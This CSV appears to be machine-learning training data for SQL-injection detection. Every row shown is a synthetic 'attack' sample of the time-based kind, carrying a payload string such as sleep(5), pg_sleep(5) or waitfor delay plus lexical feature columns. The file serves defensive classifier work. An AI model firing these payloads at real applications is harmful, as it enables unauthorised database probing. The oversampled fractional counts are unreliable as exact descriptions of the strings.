id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000132,attack,time,1 where 7224  =  7224 and sleep  (  5  )  #,nearest_attack_euclidean,R000072,0.5752426059761077,45.007234594636145,19.59855308107277,3.4011565525403955,13.0,10.0,17.605787675708918,4.401446918927229,0.28968311544076064,0.22283316572366207,0.3899869750684618,0.09749674376711545,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.40144691892723,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000238,0.2575887611838098,27.0,19.89315434957633,4.1975084188606475,12.0,4.0,3.0,8.0,0.4444444444444444,0.14814814814814814,0.1111111111111111,0.2962962962962963,2.1068456504236686,0.8931543495763312,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.8931543495763312,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000059,0.7162134566761925,49.68868919196039,18.924524323215845,3.5366864643962055,24.0,1.0,17.15095135356831,7.5377378383920774,0.4842354580167556,0.02017647741736482,0.3440116103675551,0.15157645419832444,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.537737838392078,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R000065,0.2480823342887575,54.083621638455085,17.91637836154491,3.2643846904356337,22.08362163845509,1.9999999999999998,22.0,8.0,0.4083083812897518,0.036980726169390514,0.4067879878632956,0.14792290467756203,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0836216384550887,0.9163783615449113,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000080,0.2770886037975335,51.125880807387354,18.125880807387354,3.1028062552401625,10.0,10.0,24.0,7.125880807387354,0.19560376769461782,0.1956037676946178,0.46944904246708274,0.1393434221436816,0.1258808073873534,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.12588080738735347,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,time," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",nearest_attack_euclidean,R000081,0.7724777692636764,52.9094629123896,16.969820970796533,3.1505450003906903,22.0,1.0,22.424552426991333,7.484910485398266,0.417139934259796,0.018960906102718,0.42251370110777664,0.14138545852970932,0.0,3.0,0.0,0.0,0.0,1.0,0.0,3.484910485398266,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,time,"1"" where 3227  =  3227 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000066,0.3972946313151279,46.0,23.68083679297962,4.206103247135261,17.0,12.0,9.0,8.0,0.3695652173913043,0.2608695652173913,0.1956521739130435,0.17391304347826086,2.1595816035101913,0.8404183964898083,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.8404183964898084,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000139,attack,time,"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000171,0.1495238783191292,51.0,24.827493769319624,4.137463189433699,17.0,12.0,13.0,9.0,0.3333333333333333,0.23529411764705882,0.2549019607843137,0.17647058823529413,2.057502076893458,0.9424979231065417,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.9424979231065418,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,time,1' where 9003  =  9003 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000264,0.047583543374315494,45.943205635863094,22.0,4.056836353273271,17.0,12.0,9.0,7.943205635863094,0.37003164453639004,0.26119880790804006,0.19589910593103002,0.17287044162453988,2.9432056358630936,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000141,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000230,0.8398617138917291,52.4966543122158,21.4966543122158,3.48960614364431,16.986617248863205,3.0,21.006691375568398,11.503345687784199,0.3225976788666843,0.057161694110880554,0.4007911526569833,0.21944947436545184,2.0,3.0,0.0,0.0,0.0,1.0,0.0,2.7516728438920994,0.7516728438920997,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000142,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000146,0.9240753373729133,54.71948602642611,17.28051397357389,3.2291430578532765,21.877944105704437,1.9999999999999998,22.56102794714778,8.28051397357389,0.39957533575957693,0.03655253466233932,0.4124672877143951,0.15140484186368858,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.2805139735738904,0.0,4.0,0.0,0.0,0.0,0.2805139735738904,1.0,0.0,0.0,0.0,0.0,0.2805139735738904,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",nearest_attack_euclidean,R000295,0.7661737071738393,44.58534424348773,22.792672121743866,4.180678537050447,23.82931151302454,3.7926721217438653,8.378016365231595,8.58534424348773,0.5353261501219051,0.08492447984729871,0.18746389573335,0.19228547429744616,2.0,3.7926721217438653,0.0,0.0,0.0,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.7926721217438651,1.0,1.0,0.0,0.0,0.0,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000084,0.00025006509113614366,42.99991859722422,14.000081402775779,2.524079825863153,9.999837194448443,1.9999999999999998,24.0,7.000081402775779,0.23255471394742014,0.04651171805401526,0.558140616648183,0.1627929513503815,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,5.0,8.140277577908805e-05,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.14027757790603e-05,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000814027757794
SMOTE_000145,attack,time,"1%""   )    )     )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,0.15532504089585733,43.92213800024285,14.922138000242853,2.6154865096919737,10.0,1.9999999999999998,24.0,7.922138000242853,0.2276842600409997,0.04553685200819994,0.5464422240983993,0.18033666385240102,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.9221380002428533,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000146,attack,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",nearest_attack_euclidean,R000295,0.21504784374198357,45.12054705071389,23.0,4.1488365246082815,23.0,3.939726474643057,9.180820576070829,9.0,0.5098001975572485,0.0873784884898733,0.20333428012612875,0.19948703382674943,2.0,3.939726474643057,0.0,0.0,0.0,1.0,0.0,0.06027352535694286,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.06027352535694308,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000006,0.9381285231051475,35.721627709365144,23.744325541873028,4.321991941697949,16.0,1.9999999999999998,4.977302167492116,12.744325541873028,0.44970773365722777,0.05621346670715348,0.13668109285558902,0.35739770678002974,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.744325541873029,0.0,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.7443255418730289,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000148,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000037,0.648964387669909,27.921394237834036,13.0,2.9241809067025013,10.0,1.9999999999999998,12.337115390267229,3.5842788475668073,0.3610480768288795,0.0722096153657759,0.4389519231711205,0.1277903846342241,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.5842788475668073,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000149,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000048,1.456921742300318,48.74827110127906,17.405601662979645,3.4499415024711935,26.937067775319765,1.0,14.874135550639528,5.937067775319764,0.554596646228987,0.02065062008332115,0.30381910920844907,0.1209336244792428,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.468533887659882,0.0,0.468533887659882,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.531466112340118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.531466112340118
SMOTE_000150,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R000233,0.30882867656430446,22.320366980981365,16.66018349049068,3.951033939559753,12.0,3.6601834904906827,2.6601834904906827,4.0,0.538624422832761,0.1633597357295243,0.11847436716012755,0.17954147427758702,2.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,time,select sleep  (  5  )   and 'beuk'  =  'beuk,nearest_attack_euclidean,R000165,0.04529030723347276,44.1586462509048,17.96827074981904,3.4347533804108235,22.0,1.0,15.126917000723843,6.031729250180961,0.498381160705053,0.02265368912295697,0.34239547971626944,0.13656967045572052,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0317292501809607,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000024,0.1268555961008351,42.94230549286531,16.0,2.804092716985547,11.0,0.028847253567344744,21.942305492865312,9.971152746432654,0.25617393056068155,0.00070359155042303,0.510940678020517,0.23218179986837836,0.9711527464326555,-1.1102230246251565e-16,0.0,0.0,0.0,0.9711527464326555,0.0,4.0,0.0,4.0,0.0,0.9711527464326555,0.9711527464326555,0.0,0.0,0.02884725356734444,0.0,0.9711527464326555,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000153,attack,time,1 or sleep  (  5  )  #,nearest_attack_euclidean,R000210,0.6522664181160481,22.217594234020897,12.217594234020897,2.887654885061815,7.217594234020897,1.9999999999999998,10.0,3.0,0.3246322401389594,0.09004903464813875,0.4502451732406937,0.1350735519722081,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2175942340208975,0.7824057659791025,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000154,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000061,1.459840529901519,49.32189102579777,19.0,3.5777948228514767,27.080472756449442,1.0,15.160945512898884,6.080472756449441,0.5510491016224247,0.020410108584571166,0.3061039684465739,0.12243682134643019,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.540236378224721,0.0,0.5402363782247208,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4597636217752792,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4597636217752794
SMOTE_000155,attack,time,"1%""  )   or sleep  (  5  )  #",nearest_attack_euclidean,R000257,0.8278418467507201,30.813319421274713,13.697780096454215,2.7564733394866416,7.0,1.9999999999999998,15.81331942127471,6.0,0.2288736591636227,0.06539247404674933,0.5095564446493799,0.19617742214024803,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.302219903545785,0.6977800964542151,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,time,"1"" where 3740  =  3740 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000212,0.3487544354954104,47.20399433789139,20.759201132421722,3.56553897992041,15.0,10.0,16.96319547031311,5.2407988675782775,0.3183887830058096,0.2122591886705397,0.3585008875652774,0.11085114075837334,0.0,1.0,0.0,0.0,0.0,1.0,0.0,2.2407988675782775,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,0.6539461668012907,46.19674256602055,20.0,3.6063967788725986,21.78697026408222,1.9999999999999998,15.60651486795889,6.803257433979445,0.4713547818045099,0.04329626034595693,0.3379980586816744,0.14735089916785873,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.8032574339794449,0.0,2.0,0.0,0.0,0.0,0.8032574339794448,1.0,0.0,0.0,0.0,0.0,0.8032574339794449,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,time,"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",nearest_attack_euclidean,R000136,0.6266987380695109,47.398670124887204,18.601329875112793,3.5292538568774785,23.601329875112796,1.0,15.797340249774411,7.0,0.49834755585454116,0.02110348670217664,0.3328245505280457,0.14772440691523644,0.0,3.0,0.0,0.0,0.0,1.0,0.0,2.1993350624436028,0.0,0.8006649375563972,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19933506244360283,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1993350624436028
SMOTE_000159,attack,time,1' or sleep  (  5  ) ,nearest_attack_euclidean,R000205,0.8886500571370491,21.296373962876842,12.296373962876842,2.9780155670236224,7.296373962876842,1.9999999999999998,9.0,3.0,0.34231436251141945,0.09395509106979721,0.4227979098140875,0.14093263660469582,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2963739628768428,0.7036260371231572,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000160,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,0.13076161601925565,28.573707990502434,14.0,2.9020928498700727,7.999999999999999,1.9999999999999998,13.658966392401949,4.914741598100488,0.28076197712066164,0.07019049428016541,0.4771237263112391,0.17192380228793386,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.914741598100487,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,0.8715081258115592,32.18305810915297,19.27288226364412,3.8496569535922065,12.0,4.0,8.637293581864725,7.545764527288242,0.37702044095628456,0.12567348031876152,0.2630152637647991,0.2342908149601548,2.0,0.27288226364412066,2.0,0.0,0.0,0.0,0.0,1.2728822636441208,0.0,0.0,0.0,2.0,1.0,0.27288226364412077,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000122,0.40589146703740187,42.34636293730475,15.0,2.549650012370468,8.346362937304747,1.9999999999999998,24.0,8.0,0.1968486687599358,0.04724419595529789,0.5669303514635746,0.18897678382119157,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8268185313476266,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8268185313476264
SMOTE_000163,attack,time,1' where 9003  =  9003 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000264,0.03876066632499245,45.953736370994584,22.0,4.05651591236061,17.0,12.0,9.0,7.9537363709945845,0.3699451602382087,0.2611377601681473,0.1958533201261105,0.17306375946753344,2.9537363709945854,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000164,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,0.6416674701466276,29.66279523480384,18.831397617401922,3.9102165021314157,12.0,3.831397617401921,6.831397617401921,7.0,0.4048172109313737,0.12891755664624077,0.23012185937908422,0.23614337304330132,2.1686023825980785,-1.1102230246251565e-16,1.6627952348038426,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.8313976174019215,1.0,0.0,0.8313976174019213,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
